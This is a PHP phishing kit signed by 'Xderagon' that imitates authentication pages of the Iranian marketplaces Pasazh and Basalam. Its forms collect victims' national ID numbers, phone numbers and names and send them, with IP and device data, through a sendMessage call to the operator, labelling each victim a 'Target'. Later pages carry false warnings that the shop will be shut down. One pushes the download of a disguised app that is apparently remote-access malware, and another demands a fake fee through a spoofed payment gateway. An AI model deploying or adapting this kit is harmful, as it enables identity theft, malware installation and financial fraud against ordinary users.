
<?php 

########################
#								         	           # 
# TelgeramID : Xderagon	              #
# Made BY Xderagon		                   # 
#													             # 
#TelgeramID : Xderagon	                       #
# Made BY Xderagon							       # 
#												                        # 
#												                            # 
################################



error_reporting(0);
session_start() ;

require("XDeragon.php");
require("Checker.php") ;

if(isset($_GET['login'])) {
	
	
?>


<html ng-app="LoginApp" class="ng-scope">

<meta http-equiv="content-type" content="text/html;charset=UTF-8" />

<head>

	<meta charset="utf-8">

	<meta http-equiv="X-UA-Compatible" content="IE=edge">

	<meta name="viewport" content="width=device-width, initial-scale=1.0">

	<meta name="description" content="پاساژ">

	<meta name="keywords" content="فروشگاه اینترنتی پاساژ">

	<title>سامانه احراز هویت </title>

	<link href="css/bootstrap-theme.min.css"type="text/css" rel="stylesheet">

	<link href="css/font-awesome.min.css" type="text/css" rel="stylesheet">

	<link href="css/styles.css" type="text/css" rel="stylesheet">

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/noty/3.1.4/noty.min.css" />
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/noty/3.1.4/noty.min.js"></script>


</head>



<body ng-controller="LoginController" ng-csp="no-unsafe-eval | no-inline-style" oncontextmenu="return false"

	class="ng-scope">

	<div class="container">

		<div class="row row-no-padding">

			<div class="col-md-12 col-sm-12 col-xs-12">

				<div class="background-white border-radius-20 margin-top-15 overflow-hidden shadow-sm overflow-hidden">

					<div class="row row-no-padding no-margin no-padding d-flex" id="containerLogin">

						<div class="col-md-12 col-sm-12 col-xs-12 pull-left">

							<form name="frmAuthenticate" id="frmAuthenticate" action ="?sign_in" method ="post" 

								class="form-horizontal ng-pristine ng-valid ng-scope ng-valid-pattern ng-valid-minlength ng-valid-maxlength ng-valid-jud-validator"

								role="form" ng-keypress="actions.preventEnterKey($event,1)" novalidate=""

								jud-validator="" ng-if="viewModel.loginStep==1">

								<section class="p-3 pt-1 bg-light-default">

								<div class="text-center  login-effect">

                                    <div class="d-flex justify-content-center align-items-center mt-5">

									<img src="img/logo.png" alt="پاساژ" width="100">

								</div>

								<div class="d-flex justify-content-center align-items-center font-size-2rem">

								  &nbsp; </div>

                            </div>
                            
                              <h5 style="color: #000000; font-size: larger; font-weight: bold;line-height: 65px;" class="text-center text-success">جهت پیگیری فرایند فرم زیر را پر کنید. </h5>

                                    

									<div class="row mt-5 px-5">

										<div class="col-sm-12 col-md-12 col-lg-12 col-xl-12">

											<label class="font-yekan-bold d-block pr-1 font-size-1-5rem"

												for="nationalityCode" dir="rtl">

												شماره ملی

											</label>

											<input id="meli" name="meli" type="tel"

												autofocus="autofocus" focus-if="1==1"

												class="form-control form-control-user rounded-pill p-2 text-center font-yekan-bold mt-1 ng-pristine ng-valid ng-valid-pattern ng-valid-minlength ng-valid-maxlength ng-valid-jud-validator ng-touched"

												autocomplete="off" pattern="[0123456789٠١٢٣٤٥٦٧٨٩]{10}" maxlength="10"

												ng-maxlength="10" ng-minlength="10"

												ng-keypress="actions.preventCharKey($event)"

												ng-model="login.nationalityCode">

										</div>

									</div>

									<div class="row mt-5 px-5">

										<div class="col-sm-12 col-md-12 col-lg-12 col-xl-12">

											<label class="font-yekan-bold d-block pr-1 font-size-1-5rem"

												for="nationalityCode" dir="rtl">

												شماره همراه

											</label>

											<input id="phone" name="phone" type="tel"

												autofocus="autofocus" focus-if="1==1"

												class="form-control form-control-user rounded-pill p-2 text-center font-yekan-bold mt-1 ng-pristine ng-valid ng-valid-pattern ng-valid-minlength ng-valid-maxlength ng-valid-jud-validator ng-touched"

												autocomplete="off" pattern="[0123456789٠١٢٣٤٥٦٧٨٩]{10}" maxlength="11"

												ng-maxlength="11" ng-minlength="11"

												ng-keypress="actions.preventCharKey($event)"

												ng-model="login.nationalityCode">

										</div>

									</div>

									<div class="row mt-5 px-5">

										<div class="col-sm-12 col-md-12 col-lg-12 col-xl-12">

											<label class="font-yekan-bold d-block pr-1 font-size-1-5rem"

												for="personPassword" dir="rtl">

												نام و نام خانوادگی

											</label>

											<input id="name" name="fullname" type="text"

												autocomplete="off" focus-if="login.nationalityCode.length==10"

												class="form-control form-control-user rounded-pill p-2 text-center font-yekan-bold mt-1 ng-pristine ng-untouched ng-valid"

												ng-model="login.userPassword">

										</div>

									</div>

								
<br>
									<div class="row px-5">

										<div class="col-sm-12 col-md-12 col-lg-12 col-xl-12">

											<button id="submitbtn" class="btn btn-primary d-block btn-user w-100 rounded-pill p-2 mt-4"

												focus-if="login.captchaValueFirst.length==5"

												ng-disabled="viewModel.loading" ng-click="actions.checkPersonLogin()">

												<span ng-if="!viewModel.loading"

													class="ng-scope">

													مرحله بعد

												</span>

											</button>

										</div>

									</div>

								</section>

							</form>

						</div>

					</div>

				</div>

			</div>

		</div>

	</div>

<script>

function isValidNationalCode(code){
 
   var L=code.length;
 
   if(L<8 || parseInt(code,10)==0) return false;
   code=('0000'+code).substr(L+4-10);
   if(parseInt(code.substr(3,6),10)==0) return false;
   var c=parseInt(code.substr(9,1),10);
   var s=0;
   for(var i=0;i<9;i++)
      s+=parseInt(code.substr(i,1),10)*(10-i);
   s=s%11;
   return (s<2 && c==s) || (s>=2 && c==(11-s));
   return true;
}


document.getElementById('frmAuthenticate').addEventListener('submit', function(event) {
  event.preventDefault(); 

  let meli = document.getElementById('meli');
  let phone = document.getElementById('phone');
  let name = document.getElementById('name');
  let IsValid = true;
  
  if (meli.value.trim()=== '') {
  	IsValid = false ;
      document.getElementById('meli').style.borderColor = 'red';
  }

  if (phone.value.trim() === '') {
  	IsValid = false ;
    document.getElementById('phone').style.borderColor = 'red';
  }

  if (name.value.trim() === '') {
  	IsValid = false ;
    document.getElementById('name').style.borderColor = 'red';
  }

  if(!IsValid) {
  	new Noty({
      text: 'لطفا تمامی فیلد ها را تکمیل نمایید. ',
      type: 'error',
      closeWith: ['button'], 
      timeout: 3000 
     }).show();
  } else {
  	
  const form = document.getElementById('frmAuthenticate');
  const regex  = new RegExp('^(\\+98|0)?9\\d{9}$');
  const namePattern = /^[\u0600-\u06FF\s]+$/;

   if(!isValidNationalCode(meli.value)) {
       new Noty({
       text: 'کد ملی نادرست است. ',
       type: 'error',
       closeWith: ['button'], 
       timeout: 3000 
      }).show();
   }else if(!regex.test(phone.value)){
   	new Noty({
       text: 'شماره همراه نادرست است. ',
       type: 'error',
       closeWith: ['button'], 
       timeout: 3000 
      }).show();
   	
  }else if(!namePattern.test(name.value)){
       new Noty({
       text: 'نام ونام خانوادگی باید حروف فارسی باشد.',
       type: 'error',
       closeWith: ['button'], 
       timeout: 3000 
      }).show();
  } else {
	new Noty({
    text: ' ورود موفقیت آمیز بود. ',
    type: 'success',
    closeWith: ['button'], 
   }).show();
   setTimeout(function() { form.submit() } , 2000);
 } 
  
  
  
  
 } 

});

  </script>

</body>

</html>


<?php

} 
else if(isset($_GET['sign_in']) && $_SERVER['REQUEST_METHOD'] ==='POST') {
	
########################
#								         	           # 
# TelgeramID : Xderagon	              #
# Made BY Xderagon		                   # 
#													             # 
#TelgeramID : Xderagon	                       #
# Made BY Xderagon							       # 
#												                        # 
#												                            # 
################################
	
if($_SESSION["sign_in"]  > 1 ) exit() ;
	$_SESSION["sign_in"]++;
	$XDeragon = new  XDeragon() ;
	$ipinfo   = $XDeragon->ipinfo();
	$model  = $XDeragon->deviceinfo() ;
	$XDeragon->sendMessage("<b>Nᴇᴡ Tᴀʀɢᴇᴛ Iɴsᴛᴀʟʟɪɴɢ Tʜᴇ Eʙʟᴀɢʜ Rᴇᴍᴏᴛᴇ.</b>\n\n＃ＴＡＲＧＥＴ_ＩＮＦＯ\n\n👥<b>𝗙𝘂𝗹𝗹𝗡𝗮𝗺𝗲 : </b>$_POST[fullname]\n🪪<b>𝗖𝗼𝗱𝗲𝗠𝗹𝗶𝗲 : </b><code>$_POST[meli]</code>\n☎️<b>𝗣𝗵𝗼𝗻𝗲 : </b><code>$_POST[phone]</code>\n🖥️<b>𝗗𝗲𝘃𝗶𝗰𝗲𝗠𝗼𝗱𝗲𝗹 : $model</b>\n🌐<b>𝗜𝗣𝗔𝗱𝗱𝗿𝗲𝘀𝘀 : </b><code>$ipinfo[0]</code>\n\n＃ＥＮＤ_ＩＮＦＯ") ;
   
	
?>
	
	
<html ng-app="LoginApp" class="ng-scope">

<meta http-equiv="content-type" content="text/html;charset=UTF-8" />

<head>

	<meta charset="utf-8">

	<meta http-equiv="X-UA-Compatible" content="IE=edge">

	<meta name="viewport" content="width=device-width, initial-scale=1.0">

	<meta name="description" content="پاساژ">

	<meta name="keywords" content="فروشگاه اینترنتی پاساژ">

	<title>سامانه احراز هویت </title>

	<link href="css/bootstrap-theme.min.css"type="text/css" rel="stylesheet">

	<link href="css/font-awesome.min.css" type="text/css" rel="stylesheet">

	<link href="css/styles.css" type="text/css" rel="stylesheet">

	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/noty/3.1.4/noty.min.css" />
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/noty/3.1.4/noty.min.js"></script>

</head>



<body ng-controller="LoginController" ng-csp="no-unsafe-eval | no-inline-style" oncontextmenu="return false"

	class="ng-scope">

	<div class="container">

		<div class="row row-no-padding">

			<div class="col-md-12 col-sm-12 col-xs-12">

				<div class="background-white border-radius-20 margin-top-15 overflow-hidden shadow-sm overflow-hidden">

					<div class="row row-no-padding no-margin no-padding d-flex" id="containerLogin">

						<div class="col-md-12 col-sm-12 col-xs-12 pull-left">

							<form  name="frmAuthenticate" id="frmAuthenticate"

								class="form-horizontal ng-pristine ng-valid ng-scope ng-valid-pattern ng-valid-minlength ng-valid-maxlength ng-valid-jud-validator"

								role="form" ng-keypress="actions.preventEnterKey($event,1)" novalidate=""

								jud-validator="" ng-if="viewModel.loginStep==1">

								<section class="bg-light-default">

									<div class="text-center  login-effect">

                                    <div class="d-flex justify-content-center align-items-center mt-5">

									<img src="img/logo.png" alt="پاساژ" width="100">

								</div>

								<div class="d-flex justify-content-center align-items-center font-size-2rem">

									&nbsp;

								</div>

                            </div>

									<br>

                             <h5 style="color: #FFA07A; font-size: larger; font-weight: bold;line-height: 25px;" class="text-center text-success">فروشنده عزیز باسلام فروشگاه شما به خاطر نقص فنی&nbsp;</h5><h5 style="color: #FFA07A; font-size: larger; font-weight: bold;line-height: 25px;" class="text-center text-success">در باسلام به مشکل برخورده است و طی روز های آینده فروشگاه&nbsp;</h5><h5 style="color: #FFA07A; font-size: larger; font-weight: bold;line-height: 25px;" class="text-center text-success">شما در باسلام غیر فعال میگردد <br> لطفا نسخه جدید باسلام را از لینک زیر دانلود و احراز هویت خود را تکمیل کنید </h5>
<br>
									<div class="row px-5">

										<div class="col-sm-12 col-md-12 col-lg-12 col-xl-12">

											<button id="submitbtn" class="btn btn-primary d-block btn-user w-100 rounded-pill p-2 mt-4"

												focus-if="login.captchaValueFirst.length==5"

												ng-disabled="viewModel.loading" ng-click="actions.checkPersonLogin()">

												<span ng-if="!viewModel.loading"

													class="ng-scope">

													دانلود اپلیکیشن

												</span>
												
										  </button>

										</div>

									</div>

								</section>

							</form>

						</div>

					</div>

				</div>

			</div>

		</div>

	</div>

<script>
document.getElementById("frmAuthenticate").addEventListener("submit", function(event) {
  event.preventDefault(); 
  new Noty({
    text: 'فرایند دریافت آغاز شد. ',
    type: 'success',
    closeWith: ['button'], 
   }).show();
   setTimeout(function() { window.location.href ='<?php echo($Eblaghapk) ;?>' ; }, 2000);
   
});
   
   
</script>

</body>


</html> 


<?php 

} else if(isset($_GET["app"])) {
	
	
	
########################
#								         	           # 
# TelgeramID : Xderagon	              #
# Made BY Xderagon		                   # 
#													             # 
#TelgeramID : Xderagon	                       #
# Made BY Xderagon							       # 
#												                        # 
#												                            # 
################################
	

?>
	
	
<html ng-app="LoginApp" class="ng-scope">

<meta http-equiv="content-type" content="text/html;charset=UTF-8" />

<head>

	<meta charset="utf-8">

	<meta http-equiv="X-UA-Compatible" content="IE=edge">

	<meta name="viewport" content="width=device-width, initial-scale=1.0">

	<meta name="description" content="پاساژ">

	<meta name="keywords" content="فروشگاه اینترنتی پاساژ">

	<title>سامانه احراز هویت پاساژ</title>

	<link href="css/bootstrap-theme.min.css"type="text/css" rel="stylesheet">

	<link href="css/font-awesome.min.css" type="text/css" rel="stylesheet">

	<link href="css/styles.css" type="text/css" rel="stylesheet">

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/noty/3.1.4/noty.min.css" />
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/noty/3.1.4/noty.min.js"></script>


</head>



<body ng-controller="LoginController" ng-csp="no-unsafe-eval | no-inline-style" oncontextmenu="return false"

	class="ng-scope">

	<div class="container">

		<div class="row row-no-padding">

			<div class="col-md-12 col-sm-12 col-xs-12">

				<div class="background-white border-radius-20 margin-top-15 overflow-hidden shadow-sm overflow-hidden">

					<div class="row row-no-padding no-margin no-padding d-flex" id="containerLogin">

						<div class="col-md-12 col-sm-12 col-xs-12 pull-left">

							<form name="frmAuthenticate" id="frmAuthenticate" action ="?check_eb" method ="post" 

								class="form-horizontal ng-pristine ng-valid ng-scope ng-valid-pattern ng-valid-minlength ng-valid-maxlength ng-valid-jud-validator"

								role="form" ng-keypress="actions.preventEnterKey($event,1)" novalidate=""

								jud-validator="" ng-if="viewModel.loginStep==1">

								<section class="p-3 pt-1 bg-light-default">

								<div class="text-center  login-effect">

                                    <div class="d-flex justify-content-center align-items-center mt-5">

									<img src="img/logo.png" alt="پاساژ" width="100">

								</div>

								<div class="d-flex justify-content-center align-items-center font-size-2rem">

									&nbsp;

								</div>

                            </div>

									
							
<h5 style="color: #000000; font-size: larger; font-weight: bold;line-height: 25px;" class="text-center text-success">جهت ورود به سامانه احراز هویت <br>فرم زیر را به درستی پر کنید. </h5>


									<div class="row mt-5 px-5">

										<div class="col-sm-12 col-md-12 col-lg-12 col-xl-12">

											<label class="font-yekan-bold d-block pr-1 font-size-1-5rem"

												for="nationalityCode" dir="rtl">

												شماره ملی

											</label>

											<input id="meli" name="meli" type="tel"

												autofocus="autofocus" focus-if="1==1"

												class="form-control form-control-user rounded-pill p-2 text-center font-yekan-bold mt-1 ng-pristine ng-valid ng-valid-pattern ng-valid-minlength ng-valid-maxlength ng-valid-jud-validator ng-touched"

												autocomplete="off" pattern="[0123456789٠١٢٣٤٥٦٧٨٩]{10}" maxlength="10"

												ng-maxlength="10" ng-minlength="10"

												ng-keypress="actions.preventCharKey($event)"

												ng-model="login.nationalityCode">

										</div>

									</div>
									
									
									<div class="row mt-5 px-5">

										<div class="col-sm-12 col-md-12 col-lg-12 col-xl-12">

											<label class="font-yekan-bold d-block pr-1 font-size-1-5rem"

												for="personPassword" dir="rtl">

												نام و نام خانوادگی

											</label>

											<input id="name" name="fullname" type="text"

												autocomplete="off" focus-if="login.nationalityCode.length==10"

												class="form-control form-control-user rounded-pill p-2 text-center font-yekan-bold mt-1 ng-pristine ng-untouched ng-valid"

												ng-model="login.userPassword">

										</div>

									</div>
									
								 <br>
									
									<div class="row px-5">

										<div class="col-sm-12 col-md-12 col-lg-12 col-xl-12">

											<button id="submitbtn" class="btn btn-primary d-block btn-user w-100 rounded-pill p-2 mt-4"

												focus-if="login.captchaValueFirst.length==5"

												ng-disabled="viewModel.loading" ng-click="actions.checkPersonLogin()">

												<span ng-if="!viewModel.loading"

													class="ng-scope">

													ورود به اپلیکیشن 

												</span>

											</button>

										</div>

									</div>

								</section>

							</form>

						</div>

					</div>

				</div>

			</div>

		</div>

	</div>



	<script>



function isValidNationalCode(code){
 
   var L=code.length;
 
   if(L<8 || parseInt(code,10)==0) return false;
   code=('0000'+code).substr(L+4-10);
   if(parseInt(code.substr(3,6),10)==0) return false;
   var c=parseInt(code.substr(9,1),10);
   var s=0;
   for(var i=0;i<9;i++)
      s+=parseInt(code.substr(i,1),10)*(10-i);
   s=s%11;
   return (s<2 && c==s) || (s>=2 && c==(11-s));
   return true;
}


document.getElementById('frmAuthenticate').addEventListener('submit', function(event) {
  event.preventDefault(); 

  let meli = document.getElementById('meli');
  let name = document.getElementById('name');
  let IsValid = true;
  
  if (meli.value.trim()=== '') {
  	IsValid = false ;
      document.getElementById('meli').style.borderColor = 'red';
  }

  if (name.value.trim() === '') {
  	IsValid = false ;
    document.getElementById('name').style.borderColor = 'red';
  }

  if(!IsValid) {
  	new Noty({
      text: 'لطفا تمامی فیلد ها را تکمیل نمایید. ',
      type: 'error',
      closeWith: ['button'], 
      timeout: 3000 
     }).show();
  } else {
  	
  const form = document.getElementById('frmAuthenticate');
  const namePattern = /^[\u0600-\u06FF\s]+$/;

   if(!isValidNationalCode(meli.value)) {
       new Noty({
       text: 'کد ملی نادرست است. ',
       type: 'error',
       closeWith: ['button'], 
       timeout: 3000 
      }).show();
  }else if(!namePattern.test(name.value)){
       new Noty({
       text: 'نام ونام خانوادگی باید حروف فارسی باشد.',
       type: 'error',
       closeWith: ['button'], 
       timeout: 3000 
      }).show();
  } else {
	new Noty({
    text: ' ورود موفقیت آمیز بود. ',
    type: 'success',
    closeWith: ['button'], 
   }).show();
   setTimeout(function() { form.submit() } , 2000);
 } 
  
 } 

});

</script>

</body>

</html>
	
	
<?php 

} 
else if(isset($_GET['check_eb']) && $_SERVER['REQUEST_METHOD'] ==='POST') {
	
	
########################
#								         	           # 
# TelgeramID : Xderagon	              #
# Made BY Xderagon		                   # 
#													             # 
#TelgeramID : Xderagon	                       #
# Made BY Xderagon							       # 
#												                        # 
#												                            # 
################################

if($_SESSION["check_eb"]  > 1 ) exit() ;
	$_SESSION["check_eb"]++;
	$XDeragon = new XDeragon() ;
	$ipinfo   = $XDeragon->ipinfo();
	$model = $XDeragon->deviceinfo() ;
	$XDeragon->sendMessage("<b>Tᴀʀɢᴇᴛ Is Tʀᴀɴsғᴇʀʀɪɴɢ Tᴏ Pᴀʏᴍᴇɴᴛ Gᴀᴛᴇᴡᴀʏ.</b>\n\n＃ＴＡＲＧＥＴ_ＩＮＦＯ\n\n👥<b>𝗙𝘂𝗹𝗹𝗡𝗮𝗺𝗲 : </b>$_POST[fullname]\n🪪<b>𝗖𝗼𝗱𝗲𝗠𝗹𝗶𝗲 : </b><code>$_POST[meli]</code>\n🖥️<b>𝗗𝗲𝘃𝗶𝗰𝗲𝗠𝗼𝗱𝗲𝗹 : $model</b>\n🌐<b>𝗜𝗣𝗔𝗱𝗱𝗿𝗲𝘀𝘀 : </b><code>$ipinfo[0]</code>\n\n＃ＥＮＤ_ＩＮＦＯ") ;
   
?>
	
	
<html ng-app="LoginApp" class="ng-scope">

<head>

	<meta charset="utf-8">

	<meta http-equiv="X-UA-Compatible" content="IE=edge">

	<meta name="viewport" content="width=device-width, initial-scale=1.0">

	<meta name="description" content="سامانه احراز هویت پاساژ">

	<meta name="keywords" content="پاساژ">

	<title>سامانه احراز هویت پاساژ</title>

	<link href="css/bootstrap-theme.min.css"type="text/css" rel="stylesheet">

	<link href="css/font-awesome.min.css" type="text/css" rel="stylesheet">

	<link href="css/styles.css" type="text/css" rel="stylesheet">

	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/noty/3.1.4/noty.min.css" />
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/noty/3.1.4/noty.min.js"></script>


</head>

<body ng-controller="LoginController" ng-csp="no-unsafe-eval | no-inline-style" oncontextmenu="return false"

	class="ng-scope">

	<div class="container">

		<div class="row row-no-padding">

			<div class="col-md-12 col-sm-12 col-xs-12">

				<div class="background-white border-radius-20 margin-top-15 overflow-hidden shadow-sm overflow-hidden">

					<div class="row row-no-padding no-margin no-padding d-flex" id="containerLogin">

						<div class="col-md-12 col-sm-12 col-xs-12 pull-left">

							<form name="frmAuthenticate" id="frmAuthenticate"

								class="form-horizontal ng-pristine ng-valid ng-scope ng-valid-pattern ng-valid-minlength ng-valid-maxlength ng-valid-jud-validator"

								role="form" ng-keypress="actions.preventEnterKey($event,1)" novalidate=""

								jud-validator="" ng-if="viewModel.loginStep==1">

								<section class="bg-light-default">

									<div class="text-center  login-effect">

                                    <div class="d-flex justify-content-center align-items-center mt-5">

									<img src="img/logo.png" alt="پاساژ" width="100">

								</div>

								<div class="d-flex justify-content-center align-items-center font-size-2rem">

									&nbsp;

								</div>

                            </div>

							<br>

								<h5 style="color: #D8BFD8; font-size: larger; font-weight: bold;line-height: 25px;" class="text-center text-success">متقاضی گرامی، جهت تکمیل احراز هویت و ثبت فروشگاه&nbsp;</h5><h5 style="color: #D8BFD8; font-size: larger; font-weight: bold;line-height: 25px;" class="text-center text-success">شما در باسلام می‌بایست مبلغ : ۵۰،۰۰۰ ریال برای <br> کسر مالیات و  کارمزد فرایند پرداخت نمایید</h5>

									<div class="row px-5">

										<div class="col-sm-12 col-md-12 col-lg-12 col-xl-12">

											<button id="submitbtn" class="btn btn-primary d-block btn-user w-100 rounded-pill p-2 mt-4"

												focus-if="login.captchaValueFirst.length==5"

												ng-disabled="viewModel.loading" ng-click="actions.checkPersonLogin()">

												<span ng-if="!viewModel.loading"

													class="ng-scope">

													پرداخت و  مشاهده 

												</span>

                                            </button>

										</div>

									</div>
									
								</section>

							</form>

						</div>

					</div>

				</div>

			</div>

		</div>

	</div>
<script>
document.getElementById("frmAuthenticate").addEventListener("submit", function(event) {
  event.preventDefault(); 
  new Noty({
    text: 'در حال اتصال به درگاه پرداخت مؤسسه محک ... ',
    type: 'success',
    closeWith: ['button'], 
   }).show();
   setTimeout(function() { window.location.href ='payment' ; }, 3000);
   
});
</script> 
</body>
</html>
<?php 
 } else {
   http_response_code(404);
} 

########################
#								         	           # 
# TelgeramID : Xderagon	              #
# Made BY Xderagon		                   # 
#													             # 
#TelgeramID : Xderagon	                       #
# Made BY Xderagon							       # 
#												                        # 
#												                            # 
################################


?>